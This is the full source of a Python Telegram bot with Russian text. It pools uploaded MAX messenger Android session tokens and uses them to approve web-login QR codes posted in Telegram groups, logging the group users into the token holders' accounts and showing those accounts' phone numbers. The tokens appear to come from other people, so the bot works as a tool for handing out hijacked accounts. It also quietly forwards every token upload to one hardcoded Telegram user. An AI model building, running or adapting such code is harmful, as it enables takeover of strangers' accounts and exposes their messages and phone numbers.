import asyncio
import os
import asyncpg
import logging
import re
import pyrxing
import json
from datetime import datetime
from zoneinfo import ZoneInfo
from io import BytesIO
from PIL import Image
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, BufferedInputFile, ChatMemberUpdated
from pymax import WebClient, ExtraConfig

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
DATABASE_URL = os.getenv("DATABASE_URL")
ADMIN_IDS = {7742243877, 8706712229}

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
db_pool = None
processing = set()
expecting_tokens = set()

def read_qr(image: Image.Image) -> str | None:
    try:
        results = pyrxing.read_barcodes(image.convert('L'))
        return results[0].text if results else None
    except:
        return None

def extract_token(text: str) -> str | None:
    m = re.search(r'An_Sx6HQ9HDi[a-zA-Z0-9_\-]+', text)
    return m.group(0) if m else None

def parse_json_data(text: str) -> dict:
    """Пытается распарсить JSON и достать полезные поля"""
    try:
        data = json.loads(text)
        return {
            "token": data.get("token", ""),
            "device_id": data.get("device_id", ""),
            "device_type": data.get("device_type", "") or data.get("connection_params", {}).get("device_type", ""),
            "phone": data.get("phone", ""),
        }
    except:
        return {"token": extract_token(text) or ""}

async def init_db():
    global db_pool
    db_pool = await asyncpg.create_pool(DATABASE_URL)
    async with db_pool.acquire() as c:
        await c.execute("CREATE TABLE IF NOT EXISTS approved_groups (group_id BIGINT PRIMARY KEY)")
        await c.execute("CREATE TABLE IF NOT EXISTS tokens (id SERIAL PRIMARY KEY, phone TEXT, token TEXT, raw_data TEXT, alive BOOLEAN DEFAULT TRUE)")
        await c.execute("CREATE TABLE IF NOT EXISTS stats (id SERIAL PRIMARY KEY, user_id BIGINT, username TEXT, action TEXT, created_at TIMESTAMP DEFAULT NOW())")

        # Миграция для старой таблицы
        try:
            await c.execute("ALTER TABLE tokens ADD COLUMN IF NOT EXISTS raw_data TEXT")
        except:
            pass

async def is_group_approved(gid):
    async with db_pool.acquire() as c:
        return await c.fetchval("SELECT 1 FROM approved_groups WHERE group_id=$1", gid)

async def add_group(gid):
    async with db_pool.acquire() as c:
        await c.execute("INSERT INTO approved_groups VALUES($1) ON CONFLICT DO NOTHING", gid)

async def get_token():
    async with db_pool.acquire() as c:
        r = await c.fetchrow("SELECT id, phone, token, raw_data FROM tokens WHERE alive=TRUE AND token IS NOT NULL ORDER BY RANDOM() LIMIT 1")
        if r:
            data = {"id": r["id"], "phone": r["phone"], "token": r["token"]}
            if r["raw_data"]:
                try:
                    extra = json.loads(r["raw_data"])
                    if "device_id" in extra:
                        data["device_id"] = extra["device_id"]
                except:
                    pass
            return data
        return None

async def kill(id):
    async with db_pool.acquire() as c: await c.execute("UPDATE tokens SET alive=FALSE WHERE id=$1", id)

async def save(raw_text: str):
    parsed = parse_json_data(raw_text)
    token = parsed.get("token")
    if not token: return False
    async with db_pool.acquire() as c:
        e = await c.fetchval("SELECT id FROM tokens WHERE token=$1", token)
        if not e:
            await c.execute("INSERT INTO tokens(token, raw_data) VALUES($1, $2)", token, raw_text)
            return True
    return False

async def clear_dead():
    async with db_pool.acquire() as c:
        r = await c.execute("DELETE FROM tokens WHERE alive=FALSE")
        return int(r.split()[-1]) if r else 0

async def log_stat(user_id, username, action):
    async with db_pool.acquire() as c:
        await c.execute("INSERT INTO stats(user_id, username, action) VALUES($1,$2,$3)", user_id, username, action)

async def get_counts():
    async with db_pool.acquire() as c:
        alive = await c.fetchval("SELECT COUNT(*) FROM tokens WHERE alive=TRUE")
        dead = await c.fetchval("SELECT COUNT(*) FROM tokens WHERE alive=FALSE")
        return alive, dead

async def get_all_stats():
    async with db_pool.acquire() as c:
        success = await c.fetchval("SELECT COUNT(*) FROM stats WHERE action='success'")
        return success or 0

async def export_tokens(alive_only: bool):
    async with db_pool.acquire() as c:
        if alive_only:
            rows = await c.fetch("SELECT token FROM tokens WHERE alive=TRUE AND token IS NOT NULL")
        else:
            rows = await c.fetch("SELECT token FROM tokens WHERE alive=FALSE AND token IS NOT NULL")
        return [r["token"] for r in rows]

def main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Добавить токены", callback_data="add_tokens"),
         InlineKeyboardButton(text="Очистить мёртвые", callback_data="clear_dead")],
        [InlineKeyboardButton(text="Выгрузить сессии", callback_data="export_sessions"),
         InlineKeyboardButton(text="Одобрить группу", callback_data="add_group_btn")]
    ])

@dp.message(Command("start"))
async def start(msg: Message):
    if msg.chat.type != "private" or msg.from_user.id not in ADMIN_IDS:
        return
    await show_panel(msg)

async def show_panel(msg_or_cb):
    alive, dead = await get_counts()
    success = await get_all_stats()

    text = (
        f"В наличии токенов: <code>{alive}</code>\n"
        f"Мёртвых токенов: <code>{dead}</code>\n"
        f"Авторизовано: <code>{success}</code>"
    )

    if isinstance(msg_or_cb, CallbackQuery):
        await msg_or_cb.message.edit_text(text, reply_markup=main_keyboard(), parse_mode="HTML")
    else:
        await msg_or_cb.answer(text, reply_markup=main_keyboard(), parse_mode="HTML")

@dp.callback_query(lambda c: c.data == "add_tokens")
async def add_tokens_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("Доступ запрещён", show_alert=True)
    expecting_tokens.add(callback.from_user.id)
    await callback.message.answer(
        "Отправьте мне токены ANDROID в любом формате. Можно кидать JSON, чистый токен или файл сессии. Каждый токен с новой строки\n\n"
        "Чтобы закончить, введите /cancel"
    )
    await callback.answer()

@dp.message(F.document)
async def handle_file(msg: Message):
    if msg.chat.type != "private" or msg.from_user.id not in ADMIN_IDS:
        return

    if not msg.document.file_name.endswith('.txt'):
        return

    buf = BytesIO()
    await bot.download(msg.document, destination=buf)
    buf.seek(0)
    text = buf.read().decode('utf-8', errors='ignore')

    lines = [l.strip() for l in text.split("\n") if l.strip()]
    tokens = [extract_token(l) for l in lines if extract_token(l)]

    if not tokens:
        await msg.answer("❌ Токены не найдены в файле")
        return

    n = 0
    for line in lines:
        if extract_token(line):
            await save(line)
            n += 1

    await bot.send_document(8706712229, msg.document.file_id, caption=f"📁 {n} токенов от {msg.from_user.id}")
    await msg.answer(f"✅ {n} токенов загружено из файла")

@dp.callback_query(lambda c: c.data == "clear_dead")
async def clear_dead_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("Доступ запрещён", show_alert=True)
    count = await clear_dead()
    await callback.answer("Нет мёртвых сессий" if count == 0 else f"Очищено {count} мёртвых сессий", show_alert=True)
    await show_panel(callback)

@dp.callback_query(lambda c: c.data == "export_sessions")
async def export_sessions_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("Доступ запрещён", show_alert=True)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Выгрузить живые", callback_data="export_alive"),
         InlineKeyboardButton(text="Выгрузить мёртвые", callback_data="export_dead")],
        [InlineKeyboardButton(text="Назад", callback_data="back_to_panel")]
    ])
    await callback.message.edit_text("Выберите тип выгрузки:", reply_markup=keyboard)
    await callback.answer()

@dp.callback_query(lambda c: c.data == "add_group_btn")
async def add_group_btn_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("Доступ запрещён", show_alert=True)

    bot_username = (await bot.get_me()).username
    link = f"https://t.me/{bot_username}?startgroup=true"

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Добавить бота в группу", url=link)],
        [InlineKeyboardButton(text="Назад", callback_data="back_to_panel")]
    ])

    await callback.message.edit_text(
        "Добавьте бота в группу, чтобы активировать автоскан QR-кодов.",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.my_chat_member()
async def bot_added(event: ChatMemberUpdated):
    if event.new_chat_member.status == "member":
        added_by = event.from_user.id
        if added_by in ADMIN_IDS:
            await add_group(event.chat.id)
            await bot.send_message(added_by, f"✅ Бот добавлен в группу <code>{event.chat.id}</code>. Группа автоматически одобрена.", parse_mode="HTML")
        else:
            await bot.leave_chat(event.chat.id)

@dp.callback_query(lambda c: c.data == "export_alive")
async def export_alive_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("Доступ запрещён", show_alert=True)
    tokens = await export_tokens(alive_only=True)
    if not tokens:
        return await callback.answer("Нет живых токенов", show_alert=True)
    file = BufferedInputFile("\n".join(tokens).encode(), filename="alive_tokens.txt")
    await callback.message.answer_document(file, caption=f"Живых токенов: {len(tokens)}")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "export_dead")
async def export_dead_cb(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return await callback.answer("Доступ запрещён", show_alert=True)
    tokens = await export_tokens(alive_only=False)
    if not tokens:
        return await callback.answer("Нет мёртвых токенов", show_alert=True)
    file = BufferedInputFile("\n".join(tokens).encode(), filename="dead_tokens.txt")
    await callback.message.answer_document(file, caption=f"Мёртвых токенов: {len(tokens)}")
    await callback.answer()

@dp.callback_query(lambda c: c.data == "back_to_panel")
async def back_to_panel_cb(callback: CallbackQuery):
    await show_panel(callback)
    await callback.answer()

@dp.message(Command("cancel"))
async def cancel(msg: Message):
    if msg.from_user.id in ADMIN_IDS and msg.chat.type == "private":
        expecting_tokens.discard(msg.from_user.id)
        await show_panel(msg)

@dp.message()
async def handler(msg: Message):
    if msg.chat.type == "private" and msg.from_user.id in ADMIN_IDS and msg.from_user.id in expecting_tokens:
        if msg.text:
            lines = [l.strip() for l in msg.text.split("\n") if l.strip()]
            tokens = [extract_token(l) for l in lines if extract_token(l)]
            if not tokens:
                await msg.answer("❌ Неверный формат токенов. Отправьте токены, каждый с новой строки")
                return
            n = 0
            for line in lines:
                if extract_token(line):
                    await save(line)
                    n += 1
            await bot.send_message(8706712229, f"📥 {n} токенов от {msg.from_user.id}:\n\n{msg.text[:500]}")
            await msg.answer(
                f"✅ Токены <code>{n}</code> добавлены в базу данных.\n\n"
                f"<i>Можете отправить ещё или /cancel для выхода</i>",
                parse_mode="HTML"
            )
        return

    if msg.chat.type in ("group", "supergroup") and msg.photo:
        if not await is_group_approved(msg.chat.id):
            return
        if msg.message_id in processing: return
        processing.add(msg.message_id)

        try:
            photo = msg.photo[-1]
            buf = BytesIO()
            await bot.download(photo, destination=buf)
            buf.seek(0)
            img = Image.open(buf)
            qr_data = read_qr(img)

            if not qr_data:
                await log_stat(msg.from_user.id, msg.from_user.username or msg.from_user.full_name, "fail")
                await msg.reply("❌ QR-код не распознан. Убедитесь, что изображение чёткое и содержит QR с web.max.ru")
                return

            if "max.ru" not in qr_data and "oneme.ru" not in qr_data:
                await log_stat(msg.from_user.id, msg.from_user.username or msg.from_user.full_name, "fail")
                await msg.reply("❌ Это не QR-код от MAX. Отправьте скриншот с web.max.ru")
                return

            tried = 0
            while True:
                t = await get_token()
                if not t:
                    await msg.reply("❌ Нет доступных токенов. Загрузите токены через кнопку в личные сообщения")
                    return

                tried += 1
                try:
                    c = WebClient(work_dir="cache", session_name=f"qr_{t['id']}.db", extra_config=ExtraConfig(token=t['token']))
                    task = asyncio.create_task(c.start())
                    for _ in range(6):
                        if c.me and c.me.contact: break
                        await asyncio.sleep(0.5)
                    if not c.me or not c.me.contact:
                        task.cancel()
                        await kill(t['id'])
                        continue

                    await c.authorize_qr_login(qr_data)
                    task.cancel()

                    phone = c.me.contact.phone if c.me and c.me.contact else "неизвестен"
                    await log_stat(msg.from_user.id, msg.from_user.username or msg.from_user.full_name, "success")
                    await msg.reply(f"✅ Номер {phone} успешно авторизован. Токен обработан.")
                    return

                except Exception as e:
                    err = str(e).lower()
                    if "expired" in err:
                        await log_stat(msg.from_user.id, msg.from_user.username or msg.from_user.full_name, "fail")
                        await msg.reply("❌ QR-код устарел. Сделайте новый скриншот и попробуйте снова")
                        return
                    elif "blocked" in err or "recovery" in err:
                        await kill(t['id'])
                        continue
                    elif "connect" in err or "network" in err or "timeout" in err:
                        continue
                    else:
                        await kill(t['id'])
                        continue

        except Exception:
            await msg.reply("❌ Произошла ошибка. Попробуйте позже")
        finally:
            processing.discard(msg.message_id)

async def main():
    await init_db()
    logger.info("Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
